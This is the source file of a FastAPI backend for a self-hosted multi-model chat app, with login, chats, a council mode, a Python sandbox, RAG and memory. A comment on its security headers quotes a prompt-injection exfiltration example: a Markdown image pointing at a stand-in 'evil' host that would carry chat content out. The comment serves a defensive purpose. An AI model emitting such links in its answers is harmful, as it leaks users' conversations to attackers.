"""FastAPI app: JSON/NDJSON API under /api, static frontend under /."""
import asyncio
import json
from typing import Annotated, AsyncIterator, Literal
from urllib.parse import quote

from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, JSONResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from app import (auth, benchmark, chats, config, export, gpu, history, judge, memory, rag, sandbox, storage, titles, tools,
                 uploads, users, websearch)
from app.config import ROOT
from app.modes import chat, council, speedtest
from app.ollama import OllamaClient, OllamaError

app = FastAPI(title="Local Council")

# Reachable without login, so the page can ask whether a password is needed and log in.
OPEN_PATHS = {"/api/auth", "/api/login"}

# Only files from this server: no remote scripts, and no remote images, so injected Markdown like
# ![](http://evil/?q=…) in an answer cannot send chat content anywhere. Inline styles are needed by KaTeX.
SECURITY_HEADERS = {
    "Content-Security-Policy": (
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
        "font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; "
        "form-action 'self'"
    ),
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
}


@app.middleware("http")
async def guard(request: Request, call_next):
    cfg = config.load()
    if not auth.host_allowed(request.headers.get("host", ""), cfg):
        return JSONResponse({"detail": "Host nicht erlaubt. In config.json unter server.allowed_hosts eintragen."},
                            status_code=400)
    if request.url.path.startswith("/api/") and request.url.path not in OPEN_PATHS:
        user = users.open_user() or users.from_token(request.cookies.get(auth.COOKIE))
        if not user:
            return JSONResponse({"detail": "Anmeldung erforderlich."}, status_code=401)
        request.state.user = user
    response = await call_next(request)
    for name, value in SECURITY_HEADERS.items():
        response.headers.setdefault(name, value)
    # Without this, browsers keep using cached JS for hours after an update (unchanged files still get a cheap 304).
    response.headers.setdefault("Cache-Control", "no-cache")
    return response


def current_user(request: Request) -> str:
    return request.state.user


def is_admin(user: str) -> bool:
    return bool((users.get(user) or {}).get("admin"))


def require_admin(request: Request) -> str:
    if not is_admin(request.state.user):
        raise HTTPException(403, "Das darf nur ein Admin.")
    return request.state.user


User = Annotated[str, Depends(current_user)]
AdminUser = Annotated[str, Depends(require_admin)]
ADMIN = [Depends(require_admin)]


class SpeedtestRequest(BaseModel):
    prompt: str = Field(min_length=1)
    models: list[str] | None = None
    parallel: bool | None = None
    record: bool = True  # False for benchmark warm-up runs


class Message(BaseModel):
    role: Literal["user", "assistant"]
    content: str
    attachments: list[str] = []  # upload ids, see app.uploads
    members: list[dict] = []  # Council answers: the members' final positions [{label, role, content}]


class CouncilMember(BaseModel):
    model: str = Field(min_length=1)
    role: str = Field(default="", max_length=60)
    system: str = Field(default="", max_length=4000)


class CouncilRequest(BaseModel):
    """A question to the Council; `messages` is the whole session, the last one the new question."""
    messages: list[Message] = Field(min_length=1)
    members: list[CouncilMember] = Field(min_length=2, max_length=6)
    synthesizer: str | None = None
    rounds: int = Field(default=2, ge=0, le=5)
    parallel: bool = False
    options: dict | None = None
    think: bool | None = None
    knowledge: str | None = None
    tools: bool = False
    web: bool = False
    tool_steps: int = Field(default=3, ge=1, le=5)
    judge: str | None = None  # model that scores the answers afterwards
    memory: bool = False
    chat_id: str | None = None


class ChatRequest(BaseModel):
    messages: list[Message] = Field(min_length=1)
    model: str | None = None
    system: str | None = None
    options: dict | None = None  # e.g. {"temperature": 0.7, "num_ctx": 8192}, on top of ollama.options
    think: bool | None = None
    knowledge: str | None = None  # knowledge base id (RAG)
    tools: bool = False
    web: bool = False
    memory: bool = False  # put the user's remembered facts into the system prompt (app.memory)
    code: bool = False  # code mode: the model writes runnable Python for the sandbox (app.sandbox)


class ModelRequest(BaseModel):
    model: str = Field(min_length=1)


def ndjson(events: AsyncIterator[dict]) -> StreamingResponse:
    async def body():
        try:
            async for event in events:
                yield json.dumps(event, ensure_ascii=False) + "\n"
        except Exception as e:
            yield json.dumps({"type": "error", "error": str(e)}, ensure_ascii=False) + "\n"

    return StreamingResponse(
        body(),
        media_type="application/x-ndjson",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


def _unique(models: list[str]) -> list[str]:
    return list(dict.fromkeys(m for m in models if m))


def public_config(cfg: dict) -> dict:
    """The config without the password hash and session secret."""
    return {k: v for k, v in cfg.items() if k != "auth"}


@app.get("/api/config")
def get_config(user: User):
    """The user's view of the config: their own sections (users.USER_SECTIONS) on top of config.json. Folders on the
    server (code.roots) are only shown to admins."""
    cfg = public_config(users.config_for(user))
    if not is_admin(user):
        cfg["code"] = {k: v for k, v in cfg.get("code", {}).items() if k != "roots"}
    return cfg


@app.put("/api/config")
def put_config(cfg: dict, user: User):
    """The user's own sections are stored for them; all other sections are the server's and need an admin."""
    cfg.pop("auth", None)  # passwords are only changed via /api/auth/password and /api/users
    own = {section: cfg.pop(section) for section in users.USER_SECTIONS if section in cfg}
    if cfg:
        if not is_admin(user):
            raise HTTPException(403, "Server-Einstellungen kann nur ein Admin ändern.")
        config.update(cfg)
    if own:
        users.update_settings(user, own)
    return public_config(users.config_for(user))


# ---------- Login and accounts ----------

class LoginRequest(BaseModel):
    username: str = ""
    password: str


class PasswordRequest(BaseModel):
    current: str = ""
    password: str


@app.get("/api/auth")
def get_auth(request: Request):
    """Who is logged in. "open": there is only one account and it has no password, so no login is needed."""
    open_user = users.open_user()
    name = open_user or users.from_token(request.cookies.get(auth.COOKIE))
    return {"logged_in": bool(name), "open": bool(open_user), "user": users.get(name) if name else None}


def _with_cookie(response: Response, user: str) -> Response:
    response.set_cookie(auth.COOKIE, users.make_token(user), max_age=auth.MAX_AGE, httponly=True, samesite="lax")
    return response


@app.post("/api/login")
async def login(req: LoginRequest, request: Request):
    if users.open_user():
        return {"ok": True}
    name = req.username.strip().lower()
    keys = auth.login_keys(request.client.host if request.client else "?", name)
    if auth.login_blocked(keys):
        raise HTTPException(429, "Zu viele falsche Versuche. Bitte in 15 Minuten wieder versuchen.")
    if not users.check_password(name, req.password):
        auth.record_failure(keys)
        await asyncio.sleep(1)  # slows down guessing
        raise HTTPException(401, "Benutzername oder Passwort falsch.")
    auth.reset_failures(keys)
    return _with_cookie(JSONResponse({"ok": True}), name)


@app.post("/api/logout")
def logout():
    response = JSONResponse({"ok": True})
    response.delete_cookie(auth.COOKIE)
    return response


@app.put("/api/auth/password")
def put_password(req: PasswordRequest, user: User):
    """Changes the user's own password (logs them out on their other devices). Only the single account of an
    open app may also remove it again (empty password)."""
    me = users.get(user)
    if me["has_password"] and not users.check_password(user, req.current):
        raise HTTPException(400, "Das bisherige Passwort stimmt nicht.")
    if not req.password and len(users.list_all()) > 1:
        raise HTTPException(400, "Bitte ein Passwort eingeben.")
    me = users.update(user, password=req.password)
    response = JSONResponse({"user": me})
    return _with_cookie(response, user) if me["has_password"] else response


class NewUserRequest(BaseModel):
    name: str
    password: str
    admin: bool = False


class UserChange(BaseModel):
    password: str | None = None
    admin: bool | None = None


def _users_call(fn, *args, **kwargs):
    try:
        return fn(*args, **kwargs)
    except users.UserError as e:
        raise HTTPException(400, str(e))


@app.get("/api/users", dependencies=ADMIN)
def list_users():
    return [{**u, "used": storage.usage(u["name"])} for u in users.list_all()]


@app.post("/api/users", dependencies=ADMIN)
def create_user(req: NewUserRequest):
    if users.open_user():
        raise HTTPException(400, "Bitte zuerst unter „Mein Konto“ ein eigenes Passwort setzen, sonst kannst du dich "
                                 "danach nicht mehr anmelden.")
    return _users_call(users.create, req.name, req.password, req.admin)


@app.patch("/api/users/{name}", dependencies=ADMIN)
def change_user(name: str, req: UserChange):
    if req.password == "":
        raise HTTPException(400, "Bitte ein Passwort eingeben.")
    return _users_call(users.update, name, password=req.password, admin=req.admin)


@app.delete("/api/users/{name}")
def delete_user(name: str, admin: AdminUser):
    if name == admin:
        raise HTTPException(400, "Das eigene Konto kann man nicht löschen.")
    _users_call(users.delete, name)
    uploads.forget_owner(name)
    uploads.collect_garbage(chats.referenced_uploads() | rag.referenced_uploads())
    return {"deleted": name}


@app.get("/api/models")
async def get_models():
    try:
        return await OllamaClient.from_config(config.load()).list_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.get("/api/models/loaded")
async def get_loaded_models():
    try:
        return await OllamaClient.from_config(config.load()).loaded_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/models/load")
async def load_model(req: ModelRequest, user: User):
    async with gpu.slot(user, "Modell laden"):  # loading may push out the model someone else is using
        return await _set_loaded(req.model, True)


@app.post("/api/models/unload", dependencies=ADMIN)
async def unload_model(req: ModelRequest):
    return await _set_loaded(req.model, False)


async def _set_loaded(model: str, load: bool):
    client = OllamaClient.from_config(config.load())
    try:
        await client.set_loaded(model, load)
        return await client.loaded_models()
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/models/show")
async def show_model(req: ModelRequest):
    try:
        return await OllamaClient.from_config(config.load()).show(req.model)
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.post("/api/speedtest")
def post_speedtest(req: SpeedtestRequest, user: AdminUser):
    cfg = config.load()
    models = _unique(req.models if req.models is not None else cfg["speedtest"]["models"])
    if not models:
        raise HTTPException(400, "Keine Modelle für den Speed-Test ausgewählt.")
    parallel = req.parallel if req.parallel is not None else cfg["speedtest"]["parallel"]
    return ndjson(gpu.queued(user, "Speed-Test", speedtest.run(OllamaClient.from_config(cfg), models, req.prompt,
                                                               parallel, req.record)))


@app.get("/api/speedtest/history", dependencies=ADMIN)
def get_speedtest_history():
    return history.load_all()


class PruneRequest(BaseModel):
    keep: int = Field(default=3, ge=0)


@app.post("/api/speedtest/history/prune", dependencies=ADMIN)
def prune_speedtest_history(req: PruneRequest):
    return {"removed": history.prune(req.keep)}


@app.post("/api/council")
def post_council(req: CouncilRequest, user: User):
    cfg = users.config_for(user)
    if req.messages[-1].role != "user":
        raise HTTPException(400, "Die letzte Nachricht muss die Frage sein.")
    messages = _expanded(req.messages, user)
    question = messages[-1]
    return ndjson(gpu.queued(user, "Council", memory.with_proposals(council.run(
        OllamaClient.from_config(cfg), user=user, members=[m.model_dump() for m in req.members],
        synthesizer=req.synthesizer or req.members[0].model, question=question["content"],
        images=question.get("images", []), history=[{**m, "members": r.members} for m, r in zip(messages[:-1], req.messages)],
        rounds=req.rounds, parallel=req.parallel, cfg=cfg, options=req.options, think=req.think,
        knowledge=req.knowledge, use_tools=req.tools, web=req.web, tool_steps=req.tool_steps, judge_model=req.judge,
        extra_system=memory.facts_block(user) if req.memory else "",
        final_extra=memory.PROPOSE if req.memory and memory.load(user).get("enabled", True) else "",
        allowed_urls=_typed_urls(req.messages), chat_id=req.chat_id), final_member="final")))


@app.post("/api/council/{run_id}/skip")
def skip_council(run_id: str, user: User):
    """Ends the discussion of a running Council early; the final answer is written from what is there."""
    if not council.skip(run_id, user):
        raise HTTPException(404, "Kein laufender Council mit dieser Nummer.")
    return {"ok": True}


@app.get("/api/judge")
def get_judge_scores(user: User):
    """All judge scores of the user's Council runs (see app.judge)."""
    return judge.load(user)


def _expanded(messages: list[Message], user: str) -> list[dict]:
    """Messages for Ollama, with attached files put in. Files the user may not read (someone else's id) are left
    out, as if they did not exist."""
    return [uploads.expand({**m.model_dump(exclude={"members"}),
                            "attachments": [a for a in m.attachments if storage.can_read(user, a)]})
            for m in messages]


def _typed_urls(messages: list[Message]) -> set[str]:
    """URLs the user wrote (not those in attached files): fetch_url may read them."""
    return set().union(*(tools.urls_in(m.content) for m in messages if m.role == "user"))


@app.post("/api/chat")
def post_chat(req: ChatRequest, user: User):
    cfg = users.config_for(user)
    model = req.model or cfg["chat"]["model"]
    if not model:
        raise HTTPException(400, "Kein Chat-Modell ausgewählt.")
    system = req.system if req.system is not None else cfg["chat"]["system"]
    messages = _expanded(req.messages, user)
    if req.memory:
        system = "\n\n".join(p for p in (system.strip(), memory.system_block(user)) if p)
    if req.code and code_allowed(user, cfg):
        s = sandbox.settings(cfg)
        system = "\n\n".join(p for p in (CODE_PROMPT.format(timeout=s["timeout"], memory=s["memory_mb"]), system) if p)
    return ndjson(gpu.queued(user, "Chat", memory.with_proposals(chat.run(
        OllamaClient.from_config(cfg), model, messages, system, req.options, req.think, knowledge=req.knowledge,
        use_tools=req.tools, web=req.web, cfg=cfg, user=user, allowed_urls=_typed_urls(req.messages)))))


class ChatDoc(BaseModel, extra="allow"):
    """A stored conversation. Extra fields are kept, so the frontend can add new ones without a schema change."""
    title: str = ""
    model: str = ""
    messages: list[dict] = []


@app.get("/api/chats")
def list_chats(user: User):
    return chats.list_all(user)


@app.get("/api/chats/search")
def search_chats(user: User, q: str = ""):
    return chats.search(user, q)


@app.get("/api/chats/export")
def export_all_chats(user: User):
    return Response(export.all_as_zip(user), media_type="application/zip",
                    headers={"Content-Disposition": 'attachment; filename="local-council-chats.zip"'})


class TitleRequest(BaseModel):
    model: str | None = None
    question: str
    answer: str


@app.post("/api/chats/title")
async def make_title(req: TitleRequest, user: User):
    cfg = users.config_for(user)
    model = cfg["chat"].get("title_model") or req.model
    if not model:
        raise HTTPException(400, "Kein Modell für den Titel.")
    try:
        async with gpu.slot(user, "Titel"):
            return {"title": await titles.generate(OllamaClient.from_config(cfg), model, req.question, req.answer)}
    except OllamaError as e:
        raise HTTPException(502, str(e))


@app.get("/api/chats/{chat_id}")
def get_chat(chat_id: str, user: User):
    try:
        return chats.get(user, chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")


@app.put("/api/chats/{chat_id}")
def put_chat(chat_id: str, chat: ChatDoc, user: User):
    if not chats.valid_id(chat_id):
        raise HTTPException(400, "Ungültige Chat-ID.")
    return chats.save(user, chat_id, chat.model_dump())


@app.patch("/api/chats/{chat_id}")
def patch_chat(chat_id: str, fields: dict, user: User):
    try:
        return chats.summary(chats.patch(user, chat_id, fields))
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")


@app.get("/api/chats/{chat_id}/export")
def export_chat(chat_id: str, user: User, format: Literal["md", "json"] = "md"):
    try:
        chat = chats.get(user, chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")
    body = export.to_markdown(chat) if format == "md" else export.to_json(chat)
    media = "text/markdown" if format == "md" else "application/json"
    name = export.filename(chat, format)
    return Response(body, media_type=f"{media}; charset=utf-8",
                    headers={"Content-Disposition": f"attachment; filename*=UTF-8''{quote(name)}"})


@app.delete("/api/chats/{chat_id}")
def delete_chat(chat_id: str, user: User):
    try:
        chats.delete(user, chat_id)
    except chats.ChatNotFound:
        raise HTTPException(404, "Chat nicht gefunden.")
    return {"deleted": chat_id}


# ---------- Code mode ----------

CODE_PROMPT = """You are in code mode. When code helps to answer, write one complete, runnable Python 3 script in a \
single ```python block. The user can run it with one click in a sandbox: Python 3.12 with numpy, pandas, scipy, \
sympy and matplotlib; no internet, no access to the user's files, at most {timeout} seconds and {memory} MB of memory. \
Print the results. For charts use matplotlib; plt.show() is captured and shown as an image. Keep the explanation \
short. When the user sends you the output of a run, use it to fix or continue the code."""


class CodeRequest(BaseModel):
    code: str = Field(min_length=1, max_length=100_000)


def code_allowed(user: str, cfg: dict) -> bool:
    return is_admin(user) or sandbox.settings(cfg)["allow_users"]


@app.get("/api/code")
async def get_code_status(user: User):
    cfg = config.load()
    allowed = code_allowed(user, cfg)
    return {"allowed": allowed, **(await sandbox.status(cfg) if allowed else {"available": False, "reason": ""}),
            "model": cfg.get("code", {}).get("model", "")}


@app.post("/api/code/run")
async def run_code(req: CodeRequest, user: User):
    cfg = config.load()
    if not code_allowed(user, cfg):
        raise HTTPException(403, "Code ausführen darf hier nur ein Admin (Einstellungen → Code).")
    try:
        return await sandbox.run(cfg, req.code)
    except sandbox.SandboxError as e:
        raise HTTPException(503, str(e))


class FolderRequest(BaseModel):
    path: str = Field(min_length=1)


@app.post("/api/rag/{cid}/folder")
def add_code_folder(cid: str, req: FolderRequest, user: AdminUser):
    """Indexes the source code in a folder on the server; only admins, only inside code.roots."""
    _rag_call(rag.get, user, cid)
    cfg = config.load()
    client = OllamaClient.from_config(cfg)

    async def events():
        try:
            async for event in rag.add_folder(client, user, cid, req.path, cfg.get("code", {}).get("roots", [])):
                yield event
        except (rag.RagError, OllamaError) as e:
            yield {"type": "error", "error": str(e)}

    return ndjson(gpu.queued(user, "Wissensbasis", events()))


# ---------- Benchmark: Council vs. single model (admins) ----------

class BenchmarkSetup(BaseModel):
    baseline: str = Field(min_length=1)
    members: list[CouncilMember] = Field(min_length=2, max_length=6)
    synthesizer: str = Field(min_length=1)
    rounds: int = Field(default=1, ge=0, le=5)
    parallel: bool = False
    judge: str = Field(min_length=1)


class VoteRequest(BaseModel):
    qid: str
    label: Literal["A", "B", "tie"]


def _bench_call(fn, *args):
    try:
        return fn(*args)
    except benchmark.BenchmarkError as e:
        raise HTTPException(400, str(e))


@app.get("/api/benchmark/questions", dependencies=ADMIN)
def get_bench_questions():
    return benchmark.questions()


@app.put("/api/benchmark/questions", dependencies=ADMIN)
def put_bench_questions(items: list[dict]):
    return _bench_call(benchmark.save_questions, items)


@app.get("/api/benchmark/runs", dependencies=ADMIN)
def list_bench_runs():
    return benchmark.list_runs()


@app.post("/api/benchmark/runs")
async def create_bench_run(req: BenchmarkSetup, user: AdminUser):
    _bench_call(benchmark.check_idle)
    run = benchmark.create({**req.model_dump(), "members": [m.model_dump() for m in req.members]})
    return _bench_start(run["id"], user)


@app.get("/api/benchmark/runs/{run_id}", dependencies=ADMIN)
def get_bench_run(run_id: str):
    run = _bench_call(benchmark.get, run_id)
    return {**run, "progress": benchmark.progress(run), "summary": benchmark.summary(run)}


@app.post("/api/benchmark/runs/{run_id}/start")
async def resume_bench_run(run_id: str, user: AdminUser):
    return _bench_start(run_id, user)


def _bench_start(run_id: str, user: str) -> dict:
    cfg = users.config_for(user)
    run = _bench_call(benchmark.start, run_id, user, OllamaClient.from_config(cfg), cfg)
    return {**run, "progress": benchmark.progress(run), "summary": benchmark.summary(run)}


@app.post("/api/benchmark/runs/{run_id}/stop", dependencies=ADMIN)
def stop_bench_run(run_id: str):
    benchmark.stop(run_id)
    return {"ok": True}


@app.delete("/api/benchmark/runs/{run_id}", dependencies=ADMIN)
def delete_bench_run(run_id: str):
    _bench_call(benchmark.delete, run_id)
    return {"deleted": run_id}


@app.post("/api/benchmark/runs/{run_id}/vote", dependencies=ADMIN)
def vote_bench(run_id: str, req: VoteRequest):
    return _bench_call(benchmark.vote, run_id, req.qid, req.label)


# ---------- Memory ----------

class FactRequest(BaseModel):
    text: str


class MemorySwitch(BaseModel):
    enabled: bool


def _memory_call(fn, *args):
    try:
        return fn(*args)
    except memory.FactError as e:
        raise HTTPException(400, str(e))


@app.get("/api/memory")
def get_memory(user: User):
    return memory.summary(user)


@app.put("/api/memory")
def switch_memory(req: MemorySwitch, user: User):
    memory.set_enabled(user, req.enabled)
    return memory.summary(user)


@app.post("/api/memory")
def add_fact(req: FactRequest, user: User):
    return _memory_call(memory.add, user, req.text)


@app.patch("/api/memory/{item_id}")
def edit_fact(item_id: str, req: FactRequest, user: User):
    return _memory_call(memory.edit, user, item_id, req.text)


@app.delete("/api/memory/{item_id}")
def delete_fact(item_id: str, user: User):
    memory.delete(user, item_id)
    return {"deleted": item_id}


@app.get("/api/queue")
def get_queue():
    return gpu.status()


@app.get("/api/storage")
def get_storage(user: User):
    """The user's disk usage and limits, in bytes (0 = no limit)."""
    return storage.summary(config.load(), user)


@app.post("/api/uploads")
async def post_upload(request: Request, name: str, user: User):
    """The file is the raw request body (no multipart), its name a query parameter."""
    too_big = HTTPException(413, f"Die Datei ist größer als {uploads.MAX_BYTES // 2**20} MB.")
    if int(request.headers.get("content-length") or 0) > uploads.MAX_BYTES:
        raise too_big
    data = bytearray()
    async for part in request.stream():  # also limited without Content-Length (chunked upload)
        data += part
        if len(data) > uploads.MAX_BYTES:
            raise too_big
    try:
        storage.check_upload(config.load(), user, bytes(data))
        return uploads.store(name, bytes(data), request.headers.get("content-type", ""), owner=user)
    except storage.StorageError as e:
        raise HTTPException(413, str(e))
    except uploads.UploadError as e:
        raise HTTPException(400, str(e))


@app.get("/api/uploads/{upload_id}")
def get_upload(upload_id: str, user: User):
    if not storage.can_read(user, upload_id):
        raise HTTPException(404, "Datei nicht gefunden.")
    try:
        m = uploads.meta(upload_id)
        return FileResponse(uploads.file_path(upload_id), media_type=m["type"], filename=m["name"],
                            content_disposition_type="inline")
    except uploads.UploadError as e:
        raise HTTPException(404, str(e))


# ---------- Knowledge bases (RAG) and web search ----------

class CollectionRequest(BaseModel):
    name: str = Field(min_length=1)


class DocumentRequest(BaseModel):
    upload_id: str


def _rag_call(fn, *args):
    try:
        return fn(*args)
    except rag.RagError as e:
        raise HTTPException(404, str(e))


@app.get("/api/rag")
def list_collections(user: User):
    return rag.list_all(user)


@app.post("/api/rag")
def create_collection(req: CollectionRequest, user: User):
    return rag.create(user, req.name, users.config_for(user)["rag"]["embed_model"])


@app.delete("/api/rag/{cid}")
def delete_collection(cid: str, user: User):
    _rag_call(rag.delete, user, cid)
    return {"deleted": cid}


@app.post("/api/rag/{cid}/documents")
def add_document(cid: str, req: DocumentRequest, user: User):
    """Indexes an uploaded file; streams {"type": "progress", "done", "total"} and finally the collection."""
    _rag_call(rag.get, user, cid)
    if not storage.can_read(user, req.upload_id):
        raise HTTPException(404, "Datei nicht gefunden.")
    cfg = config.load()
    try:
        meta = uploads.meta(req.upload_id)
        size = storage.index_estimate(meta.get("chars") or meta.get("size", 0))  # ZIP: its size as a rough guess
        storage.check(cfg, user, size, size)
    except storage.StorageError as e:
        raise HTTPException(413, str(e))
    client = OllamaClient.from_config(cfg)

    async def events():
        try:
            async for event in rag.add_document(client, user, cid, req.upload_id):
                yield event
        except (rag.RagError, uploads.UploadError, OllamaError) as e:
            yield {"type": "error", "error": str(e)}

    return ndjson(gpu.queued(user, "Wissensbasis", events()))


@app.delete("/api/rag/{cid}/documents/{upload_id}")
def remove_document(cid: str, upload_id: str, user: User):
    return _rag_call(rag.remove_document, user, cid, upload_id)


@app.post("/api/web/test", dependencies=ADMIN)
async def test_web():
    w = config.load()["web"]
    try:
        results = await websearch.search(w["searxng_url"], "Ollama", w.get("max_results", 10))
    except websearch.WebError as e:
        raise HTTPException(502, str(e))
    return {"count": len(results), "first": results[0]["title"] if results else None}


app.mount("/", StaticFiles(directory=ROOT / "static", html=True), name="static")
